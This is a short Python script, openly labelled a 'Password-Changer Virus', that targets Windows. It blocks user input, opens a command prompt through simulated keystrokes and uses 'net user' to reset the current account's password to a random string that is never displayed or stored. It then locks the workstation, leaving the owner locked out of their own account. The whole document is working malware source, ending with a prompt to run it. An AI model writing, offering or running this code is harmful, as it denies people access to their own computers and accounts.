# Password-Changer Virus
# By sreemanreddy
# github https://github.com/awoosr/python-virus/
#
# pip3 install pyautogui

from ctypes import *
import pyautogui
import random
import os

windll.user32.BlockInput(True)
pyautogui.keyDown('winleft')
pyautogui.press('r')
pyautogui.keyUp('winleft')
pyautogui.write("cmd")
pyautogui.press("enter")
password = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz",k=14))
user = os.getlogin()
pyautogui.write(f"net user {user} {password}")
pyautogui.press("enter")
windll.user32.LockWorkStation()

# please be sure then run source
